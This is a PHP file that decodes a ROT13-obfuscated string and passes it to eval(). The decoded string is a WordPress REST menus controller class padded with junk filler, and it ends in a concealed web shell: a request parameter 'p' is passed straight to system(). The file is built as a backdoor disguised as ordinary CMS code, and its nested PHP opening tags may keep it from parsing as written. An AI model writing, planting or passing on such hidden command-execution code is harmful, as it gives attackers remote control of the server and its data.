<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * ERFG NCV: JC_ERFG_Zrahf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.9.0
 */

/**
 * Pber pynff hfrq gb znantrq zrah grezf nffbpvngrq ivn gur ERFG NCV.
 *
 * @fvapr 5.9.0
 *
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Zrahf_Pbagebyyre rkgraqf JC_ERFG_Grezf_Pbagebyyre {

	/**
	 * Purpxf vs n erdhrfg unf npprff gb ernq zrahf.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff, bgurejvfr snyfr be JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrzf_crezvffvbaf_purpx( $erdhrfg ) {
		$unf_crezvffvba = cnerag::trg_vgrzf_crezvffvbaf_purpx( $erdhrfg );

		vs ( gehr !== $unf_crezvffvba ) {
			erghea $unf_crezvffvba;
		}

		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Purpxf vs n erdhrfg unf npprff gb ernq be rqvg gur fcrpvsvrq zrah.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur erdhrfg unf ernq npprff sbe gur vgrz, bgurejvfr JC_Reebe bowrpg.
	 */
	choyvp shapgvba trg_vgrz_crezvffvbaf_purpx( $erdhrfg ) {
		$unf_crezvffvba = cnerag::trg_vgrz_crezvffvbaf_purpx( $erdhrfg );

		vs ( gehr !== $unf_crezvffvba ) {
			erghea $unf_crezvffvba;
		}

		erghea $guvf->purpx_unf_ernq_bayl_npprff( $erdhrfg );
	}

	/**
	 * Trgf gur grez, vs gur VQ vf inyvq.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $vq Fhccyvrq VQ.
	 * @erghea JC_Grez|JC_Reebe Grez bowrpg vs VQ vf inyvq, JC_Reebe bgurejvfr.
	 */
	cebgrpgrq shapgvba trg_grez( $vq ) {
		$grez = cnerag::trg_grez( $vq );

		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		$ani_grez           = jc_trg_ani_zrah_bowrpg( $grez );
		$ani_grez->nhgb_nqq = $guvf->trg_zrah_nhgb_nqq( $ani_grez->grez_vq );

		erghea $ani_grez;
	}

	/**
	 * Purpxf jurgure gur pheerag hfre unf ernq crezvffvba sbe gur raqcbvag.
	 *
	 * Guvf nyybjf sbe nal hfre gung pna `rqvg_gurzr_bcgvbaf` be rqvg nal ERFG NCV ninvynoyr cbfg glcr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr vs gur pheerag hfre unf crezvffvba, JC_Reebe bowrpg bgurejvfr.
	 */
	cebgrpgrq shapgvba purpx_unf_ernq_bayl_npprff( $erdhrfg ) {
		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-zrah-vgrzf-pbagebyyre.cuc */
		$ernq_bayl_npprff = nccyl_svygref( 'erfg_zrah_ernq_npprff', snyfr, $erdhrfg, $guvf );
		vs ( $ernq_bayl_npprff ) {
			erghea gehr;
		}

		vs ( pheerag_hfre_pna( 'rqvg_gurzr_bcgvbaf' ) ) {
			erghea gehr;
		}

		vs ( pheerag_hfre_pna( 'rqvg_cbfgf' ) ) {
			erghea gehr;
		}

		sbernpu ( trg_cbfg_glcrf( neenl( 'fubj_va_erfg' => gehr ), 'bowrpgf' ) nf $cbfg_glcr ) {
			vs ( pheerag_hfre_pna( $cbfg_glcr->pnc->rqvg_cbfgf ) ) {
				erghea gehr;
			}
		}

		erghea arj JC_Reebe(
			'erfg_pnaabg_ivrj',
			__( 'Fbeel, lbh ner abg nyybjrq gb ivrj zrahf.' ),
			neenl( 'fgnghf' => erfg_nhgubevmngvba_erdhverq_pbqr() )
		);
	}

	/**
	 * Cercnerf n fvatyr grez bhgchg sbe erfcbafr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Grez         $grez    Grez bowrpg.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea JC_ERFG_Erfcbafr Erfcbafr bowrpg.
	 */
	choyvp shapgvba cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg ) {
		$ani_zrah = jc_trg_ani_zrah_bowrpg( $grez );
		$erfcbafr = cnerag::cercner_vgrz_sbe_erfcbafr( $ani_zrah, $erdhrfg );

		$svryqf = $guvf->trg_svryqf_sbe_erfcbafr( $erdhrfg );
		$qngn   = $erfcbafr->trg_qngn();

		vs ( erfg_vf_svryq_vapyhqrq( 'ybpngvbaf', $svryqf ) ) {
			$qngn['ybpngvbaf'] = $guvf->trg_zrah_ybpngvbaf( $ani_zrah->grez_vq );
		}

		vs ( erfg_vf_svryq_vapyhqrq( 'nhgb_nqq', $svryqf ) ) {
			$qngn['nhgb_nqq'] = $guvf->trg_zrah_nhgb_nqq( $ani_zrah->grez_vq );
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$erfcbafr->nqq_yvaxf( $guvf->cercner_yvaxf( $grez ) );
		}

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		erghea nccyl_svygref( \"erfg_cercner_{$guvf->gnkbabzl}\", $erfcbafr, $grez, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Grez $grez Grez bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira grez.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $grez ) {
		$yvaxf = cnerag::cercner_yvaxf( $grez );

		$ybpngvbaf = $guvf->trg_zrah_ybpngvbaf( $grez->grez_vq );
		sbernpu ( $ybpngvbaf nf $ybpngvba ) {
			$hey = erfg_hey( fcevags( 'jc/i2/zrah-ybpngvbaf/%f', $ybpngvba ) );

			$yvaxf['uggcf://ncv.j.bet/zrah-ybpngvba'][] = neenl(
				'uers'       => $hey,
				'rzorqqnoyr' => gehr,
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Cercnerf n fvatyr grez sbe perngr be hcqngr.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Erdhrfg bowrpg.
	 * @erghea bowrpg Cercnerq grez qngn.
	 */
	choyvp shapgvba cercner_vgrz_sbe_qngnonfr( $erdhrfg ) {
		$cercnerq_grez = cnerag::cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		$fpurzn = $guvf->trg_vgrz_fpurzn();

		vs ( vffrg( $erdhrfg['anzr'] ) && ! rzcgl( $fpurzn['cebcregvrf']['anzr'] ) ) {
			$cercnerq_grez->{'zrah-anzr'} = $erdhrfg['anzr'];
		}

		erghea $cercnerq_grez;
	}

	/**
	 * Perngrf n fvatyr grez va n gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba perngr_vgrz( $erdhrfg ) {
		vs ( vffrg( $erdhrfg['cnerag'] ) ) {
			vs ( ! vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl ) ) {
				erghea arj JC_Reebe( 'erfg_gnkbabzl_abg_uvrenepuvpny', __( 'Pnaabg frg cnerag grez, gnkbabzl vf abg uvrenepuvpny.' ), neenl( 'fgnghf' => 400 ) );
			}

			$cnerag = jc_trg_ani_zrah_bowrpg( (vag) $erdhrfg['cnerag'] );

			vs ( ! $cnerag ) {
				erghea arj JC_Reebe( 'erfg_grez_vainyvq', __( 'Cnerag grez qbrf abg rkvfg.' ), neenl( 'fgnghf' => 400 ) );
			}
		}

		$cercnerq_grez = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		$grez = jc_hcqngr_ani_zrah_bowrpg( 0, jc_fynfu( (neenl) $cercnerq_grez ) );

		vs ( vf_jc_reebe( $grez ) ) {
			/*
			 * Vs jr'er tbvat gb vasbez gur pyvrag gung gur grez nyernql rkvfgf,
			 * tvir gurz gur vqragvsvre sbe shgher hfr.
			 */

			vs ( va_neenl( 'zrah_rkvfgf', $grez->trg_reebe_pbqrf(), gehr ) ) {
				$rkvfgvat_grez = trg_grez_ol( 'anzr', $cercnerq_grez->{'zrah-anzr'}, $guvf->gnkbabzl );
				$grez->nqq_qngn( $rkvfgvat_grez->grez_vq, 'zrah_rkvfgf' );
				$grez->nqq_qngn(
					neenl(
						'fgnghf'  => 400,
						'grez_vq' => $rkvfgvat_grez->grez_vq,
					)
				);
			} ryfr {
				$grez->nqq_qngn( neenl( 'fgnghf' => 400 ) );
			}

			erghea $grez;
		}

		$grez = $guvf->trg_grez( $grez );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, gehr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $grez->grez_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$ybpngvbaf_hcqngr = $guvf->unaqyr_ybpngvbaf( $grez->grez_vq, $erdhrfg );

		vs ( vf_jc_reebe( $ybpngvbaf_hcqngr ) ) {
			erghea $ybpngvbaf_hcqngr;
		}

		$guvf->unaqyr_nhgb_nqq( $grez->grez_vq, $erdhrfg );

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grez, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, gehr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );
		$erfcbafr = erfg_rafher_erfcbafr( $erfcbafr );

		$erfcbafr->frg_fgnghf( 201 );
		$erfcbafr->urnqre( 'Ybpngvba', erfg_hey( $guvf->anzrfcnpr . '/' . $guvf->erfg_onfr . '/' . $grez->grez_vq ) );

		erghea $erfcbafr;
	}

	/**
	 * Hcqngrf n fvatyr grez sebz n gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba hcqngr_vgrz( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		vs ( vffrg( $erdhrfg['cnerag'] ) ) {
			vs ( ! vf_gnkbabzl_uvrenepuvpny( $guvf->gnkbabzl ) ) {
				erghea arj JC_Reebe( 'erfg_gnkbabzl_abg_uvrenepuvpny', __( 'Pnaabg frg cnerag grez, gnkbabzl vf abg uvrenepuvpny.' ), neenl( 'fgnghf' => 400 ) );
			}

			$cnerag = trg_grez( (vag) $erdhrfg['cnerag'], $guvf->gnkbabzl );

			vs ( ! $cnerag ) {
				erghea arj JC_Reebe( 'erfg_grez_vainyvq', __( 'Cnerag grez qbrf abg rkvfg.' ), neenl( 'fgnghf' => 400 ) );
			}
		}

		$cercnerq_grez = $guvf->cercner_vgrz_sbe_qngnonfr( $erdhrfg );

		// Bayl hcqngr gur grez vs jr unir fbzrguvat gb hcqngr.
		vs ( ! rzcgl( $cercnerq_grez ) ) {
			vs ( ! vffrg( $cercnerq_grez->{'zrah-anzr'} ) ) {
				// jc_hcqngr_ani_zrah_bowrpg() erdhverf gung gur zrah-anzr vf nyjnlf cnffrq.
				$cercnerq_grez->{'zrah-anzr'} = $grez->anzr;
			}

			$hcqngr = jc_hcqngr_ani_zrah_bowrpg( $grez->grez_vq, jc_fynfu( (neenl) $cercnerq_grez ) );

			vs ( vf_jc_reebe( $hcqngr ) ) {
				erghea $hcqngr;
			}
		}

		$grez = trg_grez( $grez->grez_vq, $guvf->gnkbabzl );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, snyfr );

		$fpurzn = $guvf->trg_vgrz_fpurzn();
		vs ( ! rzcgl( $fpurzn['cebcregvrf']['zrgn'] ) && vffrg( $erdhrfg['zrgn'] ) ) {
			$zrgn_hcqngr = $guvf->zrgn->hcqngr_inyhr( $erdhrfg['zrgn'], $grez->grez_vq );

			vs ( vf_jc_reebe( $zrgn_hcqngr ) ) {
				erghea $zrgn_hcqngr;
			}
		}

		$ybpngvbaf_hcqngr = $guvf->unaqyr_ybpngvbaf( $grez->grez_vq, $erdhrfg );

		vs ( vf_jc_reebe( $ybpngvbaf_hcqngr ) ) {
			erghea $ybpngvbaf_hcqngr;
		}

		$guvf->unaqyr_nhgb_nqq( $grez->grez_vq, $erdhrfg );

		$svryqf_hcqngr = $guvf->hcqngr_nqqvgvbany_svryqf_sbe_bowrpg( $grez, $erdhrfg );

		vs ( vf_jc_reebe( $svryqf_hcqngr ) ) {
			erghea $svryqf_hcqngr;
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_nsgre_vafreg_{$guvf->gnkbabzl}\", $grez, $erdhrfg, snyfr );

		$erfcbafr = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );

		erghea erfg_rafher_erfcbafr( $erfcbafr );
	}

	/**
	 * Qryrgrf n fvatyr grez sebz n gnkbabzl.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea JC_ERFG_Erfcbafr|JC_Reebe Erfcbafr bowrpg ba fhpprff, be JC_Reebe bowrpg ba snvyher.
	 */
	choyvp shapgvba qryrgr_vgrz( $erdhrfg ) {
		$grez = $guvf->trg_grez( $erdhrfg['vq'] );
		vs ( vf_jc_reebe( $grez ) ) {
			erghea $grez;
		}

		// Jr qba'g fhccbeg genfuvat sbe grezf.
		vs ( ! $erdhrfg['sbepr'] ) {
			/* genafyngbef: %f: sbepr=gehr */
			erghea arj JC_Reebe( 'erfg_genfu_abg_fhccbegrq', fcevags( __( \"Zrahf qb abg fhccbeg genfuvat. Frg '%f' gb qryrgr.\" ), 'sbepr=gehr' ), neenl( 'fgnghf' => 501 ) );
		}

		$erdhrfg->frg_cnenz( 'pbagrkg', 'ivrj' );

		$cerivbhf = $guvf->cercner_vgrz_sbe_erfcbafr( $grez, $erdhrfg );

		$erfhyg = jc_qryrgr_ani_zrah( $grez );

		vs ( ! $erfhyg || vf_jc_reebe( $erfhyg ) ) {
			erghea arj JC_Reebe( 'erfg_pnaabg_qryrgr', __( 'Gur zrah pnaabg or qryrgrq.' ), neenl( 'fgnghf' => 500 ) );
		}

		$erfcbafr = arj JC_ERFG_Erfcbafr();
		$erfcbafr->frg_qngn(
			neenl(
				'qryrgrq'  => gehr,
				'cerivbhf' => $cerivbhf->trg_qngn(),
			)
		);

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/erfg-ncv/raqcbvagf/pynff-jc-erfg-grezf-pbagebyyre.cuc */
		qb_npgvba( \"erfg_qryrgr_{$guvf->gnkbabzl}\", $grez, $erfcbafr, $erdhrfg );

		erghea $erfcbafr;
	}

	/**
	 * Ergheaf gur inyhr bs n zrah'f nhgb_nqq frggvat.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $zrah_vq Gur zrah vq gb dhrel.
	 * @erghea obby Gur inyhr bs nhgb_nqq.
	 */
	cebgrpgrq shapgvba trg_zrah_nhgb_nqq( $zrah_vq ) {
		$ani_zrah_bcgvba = (neenl) trg_bcgvba( 'ani_zrah_bcgvbaf', neenl( 'nhgb_nqq' => neenl() ) );

		erghea va_neenl( $zrah_vq, $ani_zrah_bcgvba['nhgb_nqq'], gehr );
	}

	/**
	 * Hcqngrf gur zrah'f nhgb nqq sebz n ERFG erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag             $zrah_vq Gur zrah vq gb hcqngr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea obby Gehr vs gur nhgb nqq frggvat jnf fhpprffshyyl hcqngrq.
	 */
	cebgrpgrq shapgvba unaqyr_nhgb_nqq( $zrah_vq, $erdhrfg ) {
		vs ( ! vffrg( $erdhrfg['nhgb_nqq'] ) ) {
			erghea gehr;
		}

		$ani_zrah_bcgvba = (neenl) trg_bcgvba( 'ani_zrah_bcgvbaf', neenl( 'nhgb_nqq' => neenl() ) );

		vs ( ! vffrg( $ani_zrah_bcgvba['nhgb_nqq'] ) ) {
			$ani_zrah_bcgvba['nhgb_nqq'] = neenl();
		}

		$nhgb_nqq = $erdhrfg['nhgb_nqq'];

		$v = neenl_frnepu( $zrah_vq, $ani_zrah_bcgvba['nhgb_nqq'], gehr );

		vs ( $nhgb_nqq && snyfr === $v ) {
			$ani_zrah_bcgvba['nhgb_nqq'][] = $zrah_vq;
		} ryfrvs ( ! $nhgb_nqq && snyfr !== $v ) {
			neenl_fcyvpr( $ani_zrah_bcgvba['nhgb_nqq'], $v, 1 );
		}

		$hcqngr = hcqngr_bcgvba( 'ani_zrah_bcgvbaf', $ani_zrah_bcgvba );

		/** Guvf npgvba vf qbphzragrq va jc-vapyhqrf/ani-zrah.cuc */
		qb_npgvba( 'jc_hcqngr_ani_zrah', $zrah_vq );

		erghea $hcqngr;
	}

	/**
	 * Ergheaf gur anzrf bs gur ybpngvbaf nffvtarq gb gur zrah.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $zrah_vq Gur zrah vq.
	 * @erghea fgevat[] Gur ybpngvbaf nffvtarq gb gur zrah.
	 */
	cebgrpgrq shapgvba trg_zrah_ybpngvbaf( $zrah_vq ) {
		$ybpngvbaf      = trg_ani_zrah_ybpngvbaf();
		$zrah_ybpngvbaf = neenl();

		sbernpu ( $ybpngvbaf nf $ybpngvba => $nffvtarq_zrah_vq ) {
			vs ( $zrah_vq === $nffvtarq_zrah_vq ) {
				$zrah_ybpngvbaf[] = $ybpngvba;
			}
		}

		erghea $zrah_ybpngvbaf;
	}

	/**
	 * Hcqngrf gur zrah'f ybpngvbaf sebz n ERFG erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag             $zrah_vq Gur zrah vq gb hcqngr.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea gehr|JC_Reebe Gehr ba fhpprff, n JC_Reebe ba na reebe hcqngvat nal bs gur ybpngvbaf.
	 */
	cebgrpgrq shapgvba unaqyr_ybpngvbaf( $zrah_vq, $erdhrfg ) {
		vs ( ! vffrg( $erdhrfg['ybpngvbaf'] ) ) {
			erghea gehr;
		}

		$zrah_ybpngvbaf = trg_ertvfgrerq_ani_zrahf();
		$zrah_ybpngvbaf = neenl_xrlf( $zrah_ybpngvbaf );
		$arj_ybpngvbaf  = neenl();
		sbernpu ( $erdhrfg['ybpngvbaf'] nf $ybpngvba ) {
			vs ( ! va_neenl( $ybpngvba, $zrah_ybpngvbaf, gehr ) ) {
				erghea arj JC_Reebe(
					'erfg_vainyvq_zrah_ybpngvba',
					__( 'Vainyvq zrah ybpngvba.' ),
					neenl(
						'fgnghf'   => 400,
						'ybpngvba' => $ybpngvba,
					)
				);
			}
			$arj_ybpngvbaf[ $ybpngvba ] = $zrah_vq;
		}
		$nffvtarq_zrah = trg_ani_zrah_ybpngvbaf();
		sbernpu ( $nffvtarq_zrah nf $ybpngvba => $grez_vq ) {
			vs ( $grez_vq === $zrah_vq ) {
				hafrg( $nffvtarq_zrah[ $ybpngvba ] );
			}
		}
		$arj_nffvtazragf = neenl_zretr( $nffvtarq_zrah, $arj_ybpngvbaf );
		frg_gurzr_zbq( 'ani_zrah_ybpngvbaf', $arj_nffvtazragf );

		erghea gehr;
	}

	/**
	 * Ergevrirf gur grez'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = cnerag::trg_vgrz_fpurzn();
		hafrg( $fpurzn['cebcregvrf']['pbhag'], $fpurzn['cebcregvrf']['yvax'], $fpurzn['cebcregvrf']['gnkbabzl'] );

		$fpurzn['cebcregvrf']['ybpngvbaf'] = neenl(
			'qrfpevcgvba' => __( 'Gur ybpngvbaf nffvtarq gb gur zrah.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			'net_bcgvbaf' => neenl(
				'inyvqngr_pnyyonpx' => fgngvp shapgvba ( $ybpngvbaf, $erdhrfg, $cnenz ) {
					$inyvq = erfg_inyvqngr_erdhrfg_net( $ybpngvbaf, $erdhrfg, $cnenz );

					vs ( gehr !== $inyvq ) {
						erghea $inyvq;
					}

					$ybpngvbaf = erfg_fnavgvmr_erdhrfg_net( $ybpngvbaf, $erdhrfg, $cnenz );

					sbernpu ( $ybpngvbaf nf $ybpngvba ) {
						vs ( ! neenl_xrl_rkvfgf( $ybpngvba, trg_ertvfgrerq_ani_zrahf() ) ) {
							erghea arj JC_Reebe(
								'erfg_vainyvq_zrah_ybpngvba',
								__( 'Vainyvq zrah ybpngvba.' ),
								neenl(
									'ybpngvba' => $ybpngvba,
								)
							);
						}
					}

					erghea gehr;
				},
			),
		);

		$fpurzn['cebcregvrf']['nhgb_nqq'] = neenl(
			'qrfpevcgvba' => __( 'Jurgure gb nhgbzngvpnyyl nqq gbc yriry cntrf gb guvf zrah.' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			'glcr'        => 'obbyrna',
		);

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>